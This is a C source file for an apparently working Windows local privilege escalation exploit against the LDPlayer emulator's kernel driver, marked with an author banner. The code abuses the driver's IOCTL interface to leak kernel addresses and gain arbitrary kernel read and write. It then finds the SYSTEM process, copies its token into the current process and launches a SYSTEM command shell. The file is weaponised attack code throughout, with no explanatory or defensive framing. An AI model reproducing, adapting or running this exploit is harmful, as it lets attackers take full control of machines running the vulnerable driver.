#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "ld_suptable.h"

static void banner(void)
{
    printf(" _._     _,-'\"\"`-._\n");
    printf("(,-.`._,'(       |\\`-/|\n");
    printf("    `-.-' \\) -`( , o o)\n");
    printf("          `-    \\_`\"'-  SiCk // afflicted.sh\n\n");
}

#define DEVU  L"\\Device\\Ld9BoxDrv"
#define COOKIE_MAGIC 0x69726f74u
#define DEV_MAGIC    0x64726962u
#define SESS_MAGIC   0x62697264u

#define G_READ_RVA  0xCA0F2ull
#define G_WRITE_RVA 0x3B988ull
#define DRV_NT_IAT  0x36170ull
#define OFF_PID   0x1D0
#define OFF_LINKS 0x1D8
#define OFF_TOKEN 0x248

typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTR;
typedef struct { ULONG Length; HANDLE Root; USTR *Name; ULONG Attr; void *sd,*sqs; } OBJATTR;
typedef struct { PVOID Info; ULONG_PTR St; } IOSB;
typedef LONG (WINAPI *pNtCreateFile)(HANDLE*,ACCESS_MASK,void*,void*,void*,ULONG,ULONG,ULONG,ULONG,void*,ULONG);
typedef LONG (WINAPI *pNtDevIoCtl)(HANDLE,HANDLE,void*,void*,void*,ULONG,void*,ULONG,void*,ULONG);

static HANDLE g_h;
static pNtCreateFile NtCreateFile_;
static pNtDevIoCtl   NtDevIoCtl_;
static uint32_t g_ck, g_sck;
static uint64_t g_pSession, g_drvBase, g_r0Base, g_ntBase;
static uint64_t g_pGVM, g_pVM;
static uint64_t g_pageU, g_pageK;
static uint64_t g_readG, g_writeG;
static uint8_t *g_lo;

static int ioctl_(uint32_t code, void *in, uint32_t il, void *out, uint32_t ol) {
    IOSB io = {0};
    return (int)NtDevIoCtl_(g_h, NULL, NULL, NULL, &io, code, in, il, out, ol);
}
static void hdr(uint8_t *b, uint32_t cbIn, uint32_t cbOut, uint32_t ck, uint32_t sck) {
    *(uint32_t*)(b+0)=ck; *(uint32_t*)(b+4)=sck; *(uint32_t*)(b+8)=cbIn;
    *(uint32_t*)(b+12)=cbOut; *(uint32_t*)(b+16)=0x42000042u; *(uint32_t*)(b+20)=0;
}

static int open_dev(void) {
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    NtCreateFile_ = (pNtCreateFile)GetProcAddress(nt,"NtCreateFile");
    NtDevIoCtl_   = (pNtDevIoCtl)GetProcAddress(nt,"NtDeviceIoControlFile");
    if(!NtCreateFile_ || !NtDevIoCtl_) return 0;
    USTR us; us.Buffer=DEVU; us.Length=(USHORT)(wcslen(DEVU)*2); us.MaximumLength=us.Length+2;
    OBJATTR oa={sizeof(oa),NULL,&us,0x40,NULL,NULL}; IOSB io={0};
    return NtCreateFile_(&g_h,GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE,&oa,&io,
                         NULL,0,3,1,0x20,NULL,0)==0;
}

static int cookie(void) {
    uint8_t b[0x38]; memset(b,0,sizeof b);
    hdr(b,0x30,0x38,COOKIE_MAGIC,0);
    memcpy(b+0x18,"The Magic Word!",15);
    *(uint32_t*)(b+0x28)=0x320000; *(uint32_t*)(b+0x2c)=0x320000;
    if (ioctl_(0x228204,b,0x30,b,0x38)!=0) return 0;
    g_ck=*(uint32_t*)(b+0x18); g_sck=*(uint32_t*)(b+0x1c); g_pSession=*(uint64_t*)(b+0x30);
    printf("[*] cookie    %08X / %08X\n", g_ck, g_sck);
    printf("[*] session   %016llX\n",(unsigned long long)g_pSession);
    return *(int32_t*)(b+0x14)==0;
}

static int leak_drvbase(void) {
    static uint8_t f[0x40E0];
    for (int att=0; att<8; att++) {
        memset(f,0,sizeof f); hdr(f,0x18,0x40E0,DEV_MAGIC,SESS_MAGIC);
        int s=ioctl_(0x228208,f,0x18,f,0x40E0);
        if (s==0 && *(int32_t*)(f+0x14)==0) break;
        Sleep(40);
    }
    uint32_t cF=*(uint32_t*)(f+0x18);
    if (cF==0 || cF>296) cF=296;
    uint64_t votes[8]={0}; int nv[8]={0}, best=0;
    for (uint32_t i=0;i<cF;i++){
        uint8_t *e=f+0x20+(size_t)i*56;
        uint64_t pfn=*(uint64_t*)(e+48);
        if ((pfn>>48)!=0xFFFF) continue;
        for (uint32_t k=0;k<sizeof(LD_SUP)/sizeof(LD_SUP[0]);k++){
            if (strncmp((char*)e,LD_SUP[k].name,31)!=0) continue;
            uint64_t base=pfn-LD_SUP[k].rva;
            if (base & 0xFFF) break;
            int fnd=-1;
            for(int j=0;j<8;j++) if(votes[j]==base){fnd=j;break;}
            if(fnd<0) for(int j=0;j<8;j++) if(nv[j]==0){votes[j]=base;fnd=j;break;}
            if(fnd>=0){ nv[fnd]++; if(nv[fnd]>nv[best]) best=fnd; }
            break;
        }
    }
    g_drvBase=votes[best];
    printf("[*] ld9drv    %016llX (x%d)\n",(unsigned long long)g_drvBase,nv[best]);
    return nv[best]>=5;
}

static uint64_t ldr_base(void) {
    static const char *R0S[]={"C:\\Program Files\\ldplayer9box\\Ld9VMMR0.r0",
                              "C:\\LDPlayer\\LDPlayer14\\Ld9VMMR0.r0",0};
    const char *path=R0S[0];
    { WIN32_FILE_ATTRIBUTE_DATA fa; int i=0;
      while(R0S[i]){ if(GetFileAttributesExA(R0S[i],0,&fa)){ path=R0S[i]; break; } i++; } }
    uint8_t b[0x148]; memset(b,0,sizeof b); hdr(b,0x148,0x28,g_ck,g_sck);
    *(uint32_t*)(b+0x18)=0x18c00c; *(uint32_t*)(b+0x1c)=0x18c000;
    strcpy((char*)(b+0x20),"Ld9VMMR0.r0"); strcpy((char*)(b+0x40),path);
    if (ioctl_(0x22820c,b,0x148,b,0x28)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    if (*(uint32_t*)(b+0x20)==0) return 0;
    return *(uint64_t*)(b+0x18);
}

static int lo_init(void) {
    for (uintptr_t a=0x10000000ull; a<0x40000000ull; a+=0x1000000ull) {
        g_lo=(uint8_t*)VirtualAlloc((LPVOID)a,0x1000,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if (g_lo) return 1;
    }
    return 0;
}

static int page_alloc(void) {
    uint8_t b[0x30]; memset(b,0,sizeof b); hdr(b,0x20,0x30,g_ck,g_sck);
    *(uint32_t*)(b+0x18)=1; b[0x1c]=1; b[0x1d]=1;
    if (ioctl_(0x228228,b,0x20,b,0x30)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    g_pageU=*(uint64_t*)(b+0x18); g_pageK=*(uint64_t*)(b+0x20);
    return (g_pageK>>48)==0xFFFF;
}

static int create_vm(void) {
    uint8_t b[0x58]; memset(b,0,sizeof b); hdr(b,0x58,0x58,DEV_MAGIC,SESS_MAGIC);
    *(uint64_t*)(b+0x18)=0;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=0x20;
    *(uint64_t*)(b+0x28)=0;
    *(uint32_t*)(b+0x30)=0x19730211;
    *(uint32_t*)(b+0x34)=0x28;
    *(uint64_t*)(b+0x38)=g_pSession;
    *(uint32_t*)(b+0x40)=1;
    if (ioctl_(0x22826C,b,0x58,b,0x58)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    g_pVM =*(uint64_t*)(b+0x48);
    g_pGVM=*(uint64_t*)(b+0x50);
    return (g_pGVM>>48)==0xFFFF;
}

static uint32_t op140(uint64_t target, uint32_t edxv, uint64_t r8v) {
    *(uint64_t*)(g_pageU+0x88)=g_pGVM;
    *(uint64_t*)(g_pageU+0xA8)=target;
    uint8_t b[0x50]; memset(b,0,sizeof b); hdr(b,0x50,0x50,DEV_MAGIC,SESS_MAGIC);
    *(uint64_t*)(b+0x18)=g_pGVM;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=0x140;
    *(uint64_t*)(b+0x28)=0;
    *(uint32_t*)(b+0x30)=0x19730211;
    *(uint32_t*)(b+0x34)=0x20;
    *(uint64_t*)(b+0x38)=g_pageK;
    *(uint32_t*)(b+0x40)=edxv;
    *(uint64_t*)(b+0x48)=r8v;
    ioctl_(0x22826C,b,0x50,b,0x50);
    return *(uint32_t*)(b+0x14);
}

static uint32_t rd32(uint64_t a){ return op140(g_readG,(uint32_t)(uintptr_t)(g_lo+0x40),a-8); }
static uint64_t rd64(uint64_t a){ return (uint64_t)rd32(a) | ((uint64_t)rd32(a+4)<<32); }
static void wr32(uint64_t a,uint32_t v){ op140(g_writeG,v,a-0x28); }
static void wr64(uint64_t a,uint64_t v){ wr32(a,(uint32_t)v); wr32(a+4,(uint32_t)(v>>32)); }

static int kstrcmp(uint64_t kva, const char *s) {
    for (size_t i=0;;i+=4) {
        uint32_t w = rd32(kva+i);
        for (int j=0;j<4;j++) {
            unsigned char kc = (unsigned char)(w >> (8*j));
            unsigned char lc = (unsigned char)s[i+j];
            if (kc != lc) return (int)kc - (int)lc;
            if (kc == 0) return 0;
        }
    }
}

static uint64_t resolve_export(uint64_t base, const char *name) {
    uint32_t lfa=rd32(base+0x3c);
    if ((lfa & 0xFFFF0000u) || lfa<0x40 || lfa>0x400) return 0;
    if (rd32(base+lfa)!=0x00004550u) return 0;
    uint32_t szImg=rd32(base+lfa+24+56);
    if (szImg<0x1000 || szImg>0x4000000) return 0;
    uint32_t expRva=rd32(base+lfa+24+112);
    if (!expRva || expRva>=szImg) return 0;
    uint64_t exp=base+expRva;
    uint32_t n=rd32(exp+0x18);
    if (!n || n>0x20000) return 0;
    uint64_t aon=base+rd32(exp+0x20), aof=base+rd32(exp+0x1c), aoo=base+rd32(exp+0x24);
    int lo=0, hi=(int)n-1;
    while (lo<=hi) {
        int mid=(lo+hi)/2;
        int c=kstrcmp(base+rd32(aon+(uint64_t)mid*4), name);
        if (c==0) {
            uint16_t ord=(uint16_t)rd32(aoo+(uint64_t)mid*2);
            return base+rd32(aof+(uint64_t)ord*4);
        }
        if (c<0) lo=mid+1; else hi=mid-1;
    }
    return 0;
}

static void enable_priv(HANDLE tok, const char *name) {
    TOKEN_PRIVILEGES tp; LUID luid;
    if (!LookupPrivilegeValueA(NULL, name, &luid)) return;
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
}

static void pop_system_shell(void) {
    HANDLE hTok=NULL, hDup=NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY|TOKEN_ADJUST_DEFAULT|
            TOKEN_ADJUST_SESSIONID|TOKEN_ADJUST_PRIVILEGES, &hTok)) {
        return;
    }
    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
            SecurityImpersonation, TokenPrimary, &hDup)) {
        return;
    }
    enable_priv(hDup, "SeTcbPrivilege");
    enable_priv(hDup, "SeAssignPrimaryTokenPrivilege");
    enable_priv(hDup, "SeIncreaseQuotaPrivilege");

    DWORD sess = WTSGetActiveConsoleSessionId();
    if (sess != 0xFFFFFFFF)
        SetTokenInformation(hDup, TokenSessionId, &sess, sizeof sess);

    STARTUPINFOA si={sizeof si};
    si.lpDesktop = (LPSTR)"winsta0\\default";
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW;
    PROCESS_INFORMATION pi={0};
    char cmd[] = "cmd.exe /k whoami & echo.";
    if (CreateProcessAsUserA(hDup, NULL, cmd, NULL, NULL, FALSE,
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[+] system shell\n");
    } else {
        printf("[-] CreateProcessAsUser failed %lu; falling back to local console\n",
               GetLastError());
        STARTUPINFOA si2={sizeof si2}; PROCESS_INFORMATION pi2={0};
        char c2[]="cmd.exe /k whoami";
        if (CreateProcessA(NULL,c2,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&si2,&pi2))
            printf("[+] system shell\n");
    }
}

int main(int argc, char **argv){
    (void)argc; (void)argv;
    banner();

    if(!lo_init()){ printf("[-] low page\n"); return 1; }
    if(!open_dev()){ printf("[-] dev\n"); return 1; }
    if(!cookie()){ printf("[-] cookie\n"); return 1; }
    if(!leak_drvbase()){ printf("[-] drvbase\n"); return 1; }

    g_r0Base = ldr_base();
    printf("[*] r0        %016llX\n",(unsigned long long)g_r0Base);
    if((g_r0Base>>48)!=0xFFFF){ printf("[-] vmm (start the emulator once)\n"); return 1; }
    g_readG  = g_r0Base + G_READ_RVA;
    g_writeG = g_r0Base + G_WRITE_RVA;
    printf("[*] rd32      r0+CA0F2   %016llX\n",(unsigned long long)g_readG);
    printf("[*] wr32      r0+3B988   %016llX\n",(unsigned long long)g_writeG);

    if(!page_alloc()){ printf("[-] page\n"); return 1; }
    if(!create_vm()){ printf("[-] gvm\n"); return 1; }

    uint32_t r0Mz = rd32(g_r0Base) & 0xFFFF;
    if(r0Mz!=0x5A4D){ printf("[-] r32\n"); return 1; }

    uint64_t ntfn = rd64(g_drvBase + DRV_NT_IAT);
    printf("[*] nt fn    %016llX\n",(unsigned long long)ntfn);
    if((ntfn>>48)!=0xFFFF){ printf("[-] nt fn\n"); return 1; }
    uint64_t psip=0;
    for (uint64_t a=(ntfn & ~0xFFFull), i=0; i<0x800 && !psip; a-=0x1000,i++) {
        if ((rd32(a)&0xFFFF)!=0x5A4D) continue;
        if (resolve_export(a,"PsGetCurrentProcessId")!=ntfn) continue;
        g_ntBase=a;
        psip = resolve_export(g_ntBase,"PsInitialSystemProcess");
    }
    if(!psip){ printf("[-] nt\n"); return 1; }
    printf("[*] ntoskrnl %016llX\n",(unsigned long long)g_ntBase);
    printf("[*] psip      %016llX\n",(unsigned long long)psip);

    uint64_t sys = rd64(psip);
    printf("[*] system    %016llX\n",(unsigned long long)sys);
    if((sys>>48)!=0xFFFF){ printf("[-] system\n"); return 1; }
    uint32_t sysPid = rd32(sys+OFF_PID);
    uint64_t sysTok = rd64(sys+OFF_TOKEN);
    printf("[*] systoken  %016llX\n",(unsigned long long)sysTok);
    if(sysPid!=4 || (sysTok>>48)!=0xFFFF){ printf("[-] token\n"); return 1; }

    uint32_t myPid = GetCurrentProcessId();
    uint64_t me=0, cur=sys;
    for(int i=0;i<100000;i++){
        uint64_t links = rd64(cur+OFF_LINKS);
        uint64_t next  = links - OFF_LINKS;
        if((next>>48)!=0xFFFF) break;
        uint32_t pid = rd32(next+OFF_PID);
        if(pid==myPid){ me=next; break; }
        cur=next; if(cur==sys) break;
    }
    if(!me){ printf("[-] self\n"); return 1; }

    printf("[!] swapping token\n");
    wr64(me+OFF_TOKEN, sysTok);
    uint64_t after = rd64(me+OFF_TOKEN);
    if(after!=sysTok){ printf("[-] write\n"); return 1; }

    pop_system_shell();
    return 0;
}
